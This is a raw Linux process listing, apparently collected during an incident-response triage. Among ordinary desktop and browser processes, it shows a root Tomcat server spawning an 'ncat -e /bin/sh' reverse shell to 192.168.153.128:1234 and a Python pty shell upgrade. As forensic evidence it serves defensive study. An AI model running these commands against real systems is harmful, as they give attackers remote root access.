F S UID          PID    PPID  C PRI  NI ADDR SZ WCHAN  STIME TTY          TIME CMD
0 S meaow       2236    1921  0  80   0 - 59017 do_pol 19:43 ?        00:00:00 /usr/libexec/at-spi2-registryd --use-gnome-session
0 S meaow       2253    1921  0  80   0 - 163959 do_pol 19:43 ?       00:00:00 /usr/libexec/gnome-shell-calendar-server
0 S meaow       2272    1921  0  80   0 - 148190 do_pol 19:43 ?       00:00:00 /usr/libexec/evolution-source-registry
0 S meaow       2274    1921  0  80   0 - 665653 do_pol 19:43 ?       00:00:00 /usr/bin/gjs -m /usr/share/gnome-shell/org.gnome.Shell.Notifications
0 S meaow       2288    1921  0  80   0 - 115593 do_pol 19:43 ?       00:00:02 /usr/bin/ibus-daemon --panel disable
0 S meaow       2289    1921  0  80   0 - 95879 do_pol 19:43 ?        00:00:00 /usr/libexec/gsd-a11y-settings
0 S meaow       2292    1921  0  80   0 - 103234 do_pol 19:43 ?       00:00:00 /usr/libexec/gsd-color
0 S meaow       2296    1921  0  80   0 - 107916 do_pol 19:43 ?       00:00:00 /usr/libexec/gsd-datetime
0 S meaow       2300    1921  0  80   0 - 114716 do_pol 19:43 ?       00:00:00 /usr/libexec/gsd-housekeeping
0 S meaow       2301    1921  0  80   0 - 102807 do_pol 19:43 ?       00:00:00 /usr/libexec/gsd-keyboard
0 S meaow       2308    1921  0  80   0 - 201782 do_pol 19:43 ?       00:00:00 /usr/libexec/gsd-media-keys
0 S meaow       2309    1921  0  80   0 - 149309 do_pol 19:43 ?       00:00:00 /usr/libexec/gsd-power
0 S meaow       2311    1921  0  80   0 - 80907 do_pol 19:43 ?        00:00:00 /usr/libexec/gsd-print-notifications
0 S meaow       2312    1921  0  80   0 - 132771 do_pol 19:43 ?       00:00:00 /usr/libexec/gsd-rfkill
0 S meaow       2313    1921  0  80   0 - 77390 do_pol 19:43 ?        00:00:00 /usr/libexec/gsd-screensaver-proxy
0 S meaow       2316    1921  0  80   0 - 135796 do_pol 19:43 ?       00:00:00 /usr/libexec/gsd-sharing
0 S meaow       2319    1921  0  80   0 - 114887 do_pol 19:43 ?       00:00:00 /usr/libexec/gsd-smartcard
0 S meaow       2320    1921  0  80   0 - 98407 do_pol 19:43 ?        00:00:00 /usr/libexec/gsd-sound
0 S meaow       2330    1921  0  80   0 - 121482 do_pol 19:43 ?       00:00:00 /usr/libexec/gsd-wacom
0 S meaow       2332    2131  0  80   0 - 76406 do_pol 19:43 ?        00:00:00 /usr/libexec/gsd-disk-utility-notify
0 S meaow       2336    2131  0  80   0 - 224358 do_pol 19:43 ?       00:00:00 /usr/libexec/evolution-data-server/evolution-alarm-notify
0 S meaow       2439    1921  0  80   0 - 152628 do_pol 19:43 ?       00:00:00 /usr/libexec/gvfs-udisks2-volume-monitor
0 S meaow       2468    2288  0  80   0 - 59161 do_pol 19:43 ?        00:00:00 /usr/libexec/ibus-memconf
0 S meaow       2476    2288  0  80   0 - 105239 do_pol 19:43 ?       00:00:01 /usr/libexec/ibus-extension-gtk3
0 S meaow       2488    1921  0  80   0 - 77606 do_pol 19:43 ?        00:00:00 /usr/libexec/ibus-portal
0 S meaow       2500    1921  0  80   0 - 136664 do_pol 19:43 ?       00:00:00 /usr/libexec/goa-daemon
0 S meaow       2516    1921  0  80   0 - 104059 do_pol 19:43 ?       00:00:00 /usr/libexec/gsd-printer
0 S meaow       2530    1921  0  80   0 - 97281 do_pol 19:43 ?        00:00:00 /usr/libexec/goa-identity-service
0 S meaow       2531    1921  0  80   0 - 77443 do_pol 19:43 ?        00:00:00 /usr/libexec/gvfs-goa-volume-monitor
0 S meaow       2541    1921  0  80   0 - 222682 do_pol 19:43 ?       00:00:00 /usr/libexec/evolution-calendar-factory
0 S meaow       2549    1921  0  80   0 - 97344 do_pol 19:43 ?        00:00:00 /usr/libexec/gvfs-afc-volume-monitor
0 S meaow       2557    1921  0  80   0 - 77690 do_pol 19:43 ?        00:00:00 /usr/libexec/gvfs-gphoto2-volume-monitor
0 S meaow       2563    1921  0  80   0 - 77448 do_pol 19:43 ?        00:00:00 /usr/libexec/gvfs-mtp-volume-monitor
0 S meaow       2579    1921  0  80   0 - 206358 do_pol 19:43 ?       00:00:00 /usr/libexec/evolution-addressbook-factory
0 S meaow       2615    2288  0  80   0 - 59192 do_pol 19:43 ?        00:00:00 /usr/libexec/ibus-engine-simple
0 S meaow       2636    1921  0  80   0 - 57527 do_pol 19:43 ?        00:00:00 /usr/libexec/dconf-service
0 S meaow       2646    1921  0  80   0 - 59076 do_pol 19:43 ?        00:00:00 /usr/libexec/gvfsd-metadata
0 S meaow       2647    2121  0  80   0 - 152360 do_pol 19:43 ?       00:00:00 /usr/libexec/gvfsd-trash --spawner :1.20 /org/gtk/gvfs/exec_spaw/0
0 S meaow       2678    1921  0  99   - - 202091 do_pol 19:43 ?       00:00:00 /usr/libexec/tracker-miner-fs-3
0 S meaow       2701    1921  0  80   0 - 698416 do_pol 19:43 ?       00:00:00 /usr/bin/gjs -m /usr/share/gnome-shell/org.gnome.ScreenSaver
0 S meaow       2715    1921  0  80   0 - 191784 do_pol 19:43 ?       00:00:00 /usr/libexec/xdg-desktop-portal
0 S meaow       2720    1921  0  80   0 - 157651 do_pol 19:43 ?       00:00:00 /usr/libexec/xdg-desktop-portal-gnome
1 I root        2760       2  0  60 -20 -     0 worker 19:43 ?        00:00:00 [kworker/u518:7-ttm]
1 I root        2762       2  0  60 -20 -     0 worker 19:43 ?        00:00:00 [kworker/u518:9-ttm]
1 I root        2777       2  0  60 -20 -     0 worker 19:43 ?        00:00:00 [kworker/u520:11-ttm]
0 S meaow       2780    2169  0  80   0 - 802814 do_pol 19:43 ?       00:00:00 gjs /usr/share/gnome-shell/extensions/ding@rastersoft.com/app/ding.js -E -P /usr/share/gnome-shell/extensions/ding@rastersoft.com/app
0 S meaow       2820    1921  0  80   0 - 104306 do_pol 19:43 ?       00:00:00 /usr/libexec/xdg-desktop-portal-gtk
4 S meaow       2841    1921  0  80   0 -  9784 do_wai 19:43 ?        00:00:00 /snap/snapd-desktop-integration/315/usr/bin/snapd-desktop-integration
1 S meaow       2900    2841  0  80   0 - 107401 do_pol 19:43 ?       00:00:00 /snap/snapd-desktop-integration/315/usr/bin/snapd-desktop-integration
1 I root        2923       2  0  80   0 -     0 worker 19:44 ?        00:00:00 [kworker/u513:5-kvfree_rcu_reclaim]
0 S meaow       3132    1921  0  80   0 - 139513 do_pol 19:44 ?       00:00:03 /usr/libexec/gnome-terminal-server
0 S meaow       3139    3132  0  80   0 -  2788 do_wai 19:44 pts/0    00:00:00 bash
1 I root        3154       2  0  60 -20 -     0 worker 19:44 ?        00:00:00 [kworker/u521:2-ttm]
0 S meaow       3174    2131  0  80   0 - 123613 do_pol 19:44 ?       00:00:00 /usr/bin/update-notifier
0 S root        3318    1921  3  80   0 - 1169945 futex_ 19:45 ?      00:00:17 /usr/bin/java -Djava.util.logging.config.file=/opt/apache-tomcat-9.0.90/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /opt/apache-tomcat-9.0.90/bin/bootstrap.jar:/opt/apache-tomcat-9.0.90/bin/tomcat-juli.jar -Dcatalina.base=/opt/apache-tomcat-9.0.90 -Dcatalina.home=/opt/apache-tomcat-9.0.90 -Djava.io.tmpdir=/opt/apache-tomcat-9.0.90/temp org.apache.catalina.startup.Bootstrap start
1 I root        4129       2  0  80   0 -     0 worker 19:49 ?        00:00:00 [kworker/1:0]
1 I root        4207       2  0  80   0 -     0 worker 19:50 ?        00:00:00 [kworker/u516:0-kvfree_rcu_reclaim]
0 S root        4233    3318  0  80   0 -  4275 do_sel 19:50 ?        00:00:00 ncat -e /bin/sh 192.168.153.128 1234
0 S root        4235    4233  0  80   0 -   700 do_wai 19:50 ?        00:00:00 /bin/sh
0 S root        4237    4235  0  80   0 -  5125 do_sel 19:51 ?        00:00:00 python3 -c import pty; pty.spawn("/bin/bash")
0 S root        4238    4237  0  80   0 -  2552 do_sel 19:51 pts/1    00:00:00 /bin/bash
0 S meaow       4558    1921  0  80   0 - 478415 futex_ 19:51 ?       00:00:00 /usr/bin/snap userd
4 S meaow       5309    2169  5  80   0 - 831196 do_pol 19:51 ?       00:00:11 /snap/firefox/6565/usr/lib/firefox/firefox
0 S meaow       5374    5309  0  80   0 -  5321 do_pol 19:51 ?        00:00:00 /snap/firefox/6565/usr/lib/firefox/crashhelper 5309 9 /tmp/ 10 12
4 S meaow       5455    5309  0  80   0 - 73954 unix_s 19:51 ?        00:00:00 /snap/firefox/6565/usr/lib/firefox/firefox -contentproc -ipcHandle 0 -signalPipe 1 -initialChannelId {4f681eb4-7129-4c96-98a4-07f6743401c2} -parentPid 5309 -greomni /snap/firefox/6565/usr/lib/firefox/omni.ja -appomni /snap/firefox/6565/usr/lib/firefox/browser/omni.ja -appDir /snap/firefox/6565/usr/lib/firefox/browser 1 forkserver
5 S meaow       5460    5455  0  80   0 - 77041 do_pol 19:51 ?        00:00:00 /snap/firefox/6565/usr/lib/firefox/firefox -contentproc -parentBuildID 20250718161710 -prefsHandle 0:34424 -prefMapHandle 1:271626 -sandboxReporter 2 -chrootClient 3 -ipcHandle 4 -initialChannelId {1dd212b6-ae5f-456d-9acb-90000524688e} -parentPid 5309 -crashReporter 5 -crashHelperPid 5374 -appDir /snap/firefox/6565/usr/lib/firefox/browser 2 socket
5 S meaow       5482    5455  0  80   0 - 625102 do_pol 19:51 ?       00:00:00 /snap/firefox/6565/usr/lib/firefox/firefox -contentproc -isForBrowser -prefsHandle 0:34614 -prefMapHandle 1:271626 -jsInitHandle 2:242012 -parentBuildID 20250718161710 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {f545c41f-5981-4355-8e67-f33223d7cdaa} -parentPid 5309 -crashReporter 6 -crashHelperPid 5374 -greomni /snap/firefox/6565/usr/lib/firefox/omni.ja -appomni /snap/firefox/6565/usr/lib/firefox/browser/omni.ja -appDir /snap/firefox/6565/usr/lib/firefox/browser 3 tab
5 S meaow       5491    5455  0  80   0 - 110298 do_pol 19:51 ?       00:00:00 /snap/firefox/6565/usr/lib/firefox/firefox -contentproc -parentBuildID 20250718161710 -prefsHandle 0:34614 -prefMapHandle 1:271626 -sandboxReporter 2 -chrootClient 3 -ipcHandle 4 -initialChannelId {cfc6874f-7b46-49d8-981c-f9e90c00f5ed} -parentPid 5309 -crashReporter 5 -crashHelperPid 5374 -appDir /snap/firefox/6565/usr/lib/firefox/browser 4 rdd
5 S meaow       5813    5455  0  80   0 - 614820 do_pol 19:51 ?       00:00:00 /snap/firefox/6565/usr/lib/firefox/firefox -contentproc -isForBrowser -prefsHandle 0:43946 -prefMapHandle 1:271626 -jsInitHandle 2:242012 -parentBuildID 20250718161710 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {c7cdc56c-1c4c-47c1-b575-d19b5af06e27} -parentPid 5309 -crashReporter 6 -crashHelperPid 5374 -greomni /snap/firefox/6565/usr/lib/firefox/omni.ja -appomni /snap/firefox/6565/usr/lib/firefox/browser/omni.ja -appDir /snap/firefox/6565/usr/lib/firefox/browser 5 tab
5 S meaow       5992    5455  0  80   0 - 76793 do_pol 19:51 ?        00:00:00 /snap/firefox/6565/usr/lib/firefox/firefox -contentproc -parentBuildID 20250718161710 -sandboxingKind 0 -prefsHandle 0:44909 -prefMapHandle 1:271626 -sandboxReporter 2 -chrootClient 3 -ipcHandle 4 -initialChannelId {45db8030-8ddb-48c3-b3b6-ecfe2bf21a8d} -parentPid 5309 -crashReporter 5 -crashHelperPid 5374 -appDir /snap/firefox/6565/usr/lib/firefox/browser 6 utility
5 S meaow       6141    5455  0  80   0 - 640167 do_pol 19:51 ?       00:00:00 /snap/firefox/6565/usr/lib/firefox/firefox -contentproc -isForBrowser -prefsHandle 0:41927 -prefMapHandle 1:271626 -jsInitHandle 2:242012 -parentBuildID 20250718161710 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {9b2ca2ed-d55f-4925-be31-a7e707a58d38} -parentPid 5309 -crashReporter 6 -crashHelperPid 5374 -greomni /snap/firefox/6565/usr/lib/firefox/omni.ja -appomni /snap/firefox/6565/usr/lib/firefox/browser/omni.ja -appDir /snap/firefox/6565/usr/lib/firefox/browser 7 tab
5 S meaow       6146    5455  1  80   0 - 638200 do_pol 19:51 ?       00:00:03 /snap/firefox/6565/usr/lib/firefox/firefox -contentproc -isForBrowser -prefsHandle 0:41927 -prefMapHandle 1:271626 -jsInitHandle 2:242012 -parentBuildID 20250718161710 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {52c9b7b9-e60f-4560-b75d-3ba646155294} -parentPid 5309 -crashReporter 6 -crashHelperPid 5374 -greomni /snap/firefox/6565/usr/lib/firefox/omni.ja -appomni /snap/firefox/6565/usr/lib/firefox/browser/omni.ja -appDir /snap/firefox/6565/usr/lib/firefox/browser 8 tab
5 S meaow       6163    5455  0  80   0 - 604913 do_pol 19:51 ?       00:00:00 /snap/firefox/6565/usr/lib/firefox/firefox -contentproc -isForBrowser -prefsHandle 0:41927 -prefMapHandle 1:271626 -jsInitHandle 2:242012 -parentBuildID 20250718161710 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {2f75ec91-c04e-4b7d-8ece-fb74bf101d47} -parentPid 5309 -crashReporter 6 -crashHelperPid 5374 -greomni /snap/firefox/6565/usr/lib/firefox/omni.ja -appomni /snap/firefox/6565/usr/lib/firefox/browser/omni.ja -appDir /snap/firefox/6565/usr/lib/firefox/browser 9 tab
1 I root        6203       2  0  80   0 -     0 worker 19:51 ?        00:00:00 [kworker/1:3-events]
1 I root        6221       2  0  80   0 -     0 worker 19:51 ?        00:00:00 [kworker/u515:3-flush-8:0]
5 S meaow       6222    5455  0  80   0 - 605096 do_pol 19:52 ?       00:00:00 /snap/firefox/6565/usr/lib/firefox/firefox -contentproc -isForBrowser -prefsHandle 0:41967 -prefMapHandle 1:271626 -jsInitHandle 2:242012 -parentBuildID 20250718161710 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {45814dc6-12de-41d1-abcd-a766e7bdcead} -parentPid 5309 -crashReporter 6 -crashHelperPid 5374 -greomni /snap/firefox/6565/usr/lib/firefox/omni.ja -appomni /snap/firefox/6565/usr/lib/firefox/browser/omni.ja -appDir /snap/firefox/6565/usr/lib/firefox/browser 10 tab
5 S meaow       6263    5455  0  80   0 - 605096 do_pol 19:52 ?       00:00:00 /snap/firefox/6565/usr/lib/firefox/firefox -contentproc -isForBrowser -prefsHandle 0:41967 -prefMapHandle 1:271626 -jsInitHandle 2:242012 -parentBuildID 20250718161710 -sandboxReporter 3 -chrootClient 4 -ipcHandle 5 -initialChannelId {7611c3f3-0c6e-4a43-9b3b-01bcdc639d2d} -parentPid 5309 -crashReporter 6 -crashHelperPid 5374 -greomni /snap/firefox/6565/usr/lib/firefox/omni.ja -appomni /snap/firefox/6565/usr/lib/firefox/browser/omni.ja -appDir /snap/firefox/6565/usr/lib/firefox/browser 11 tab
0 S meaow       6299    1921  1  80   0 - 396339 do_pol 19:52 ?       00:00:03 /usr/bin/nautilus --gapplication-service
0 S meaow       6320    2121  0  80   0 - 97057 do_pol 19:52 ?        00:00:00 /usr/libexec/gvfsd-recent --spawner :1.20 /org/gtk/gvfs/exec_spaw/1
1 I root        6329       2  0  60 -20 -     0 worker 19:52 ?        00:00:00 [kworker/u521:1-ttm]
1 I root        6343       2  0  60 -20 -     0 worker 19:52 ?        00:00:00 [kworker/2:2H-kblockd]
1 I root        6369       2  0  80   0 -     0 worker 19:52 ?        00:00:00 [kworker/3:2-events]
1 I root        6372       2  0  60 -20 -     0 worker 19:52 ?        00:00:00 [kworker/u521:3-ttm]
1 I root        6389       2  0  80   0 -     0 worker 19:53 ?        00:00:00 [kworker/2:1]
1 I root        6390       2  0  80   0 -     0 worker 19:53 ?        00:00:00 [kworker/2:3-events]
1 I root        6421       2  0  60 -20 -     0 worker 19:54 ?        00:00:00 [kworker/u518:0]
4 S root        6654    3139  0  80   0 -  4911 do_pol 19:55 pts/0    00:00:00 sudo ./uac -p ir_triage /tmp
1 S root        6655    6654  0  80   0 -  4911 do_pol 19:55 pts/2    00:00:00 sudo ./uac -p ir_triage /tmp
4 S root        6656    6655  0  80   0 -   834 do_wai 19:55 pts/2    00:00:00 /bin/sh ./uac -p ir_triage /tmp
5 S root        7815    6656  4  80   0 -   834 do_wai 19:55 pts/2    00:00:00 /bin/sh ./uac -p ir_triage /tmp
4 R root        8029    7815  0  80   0 -  2084 -      19:55 pts/2    00:00:00 ps -efl
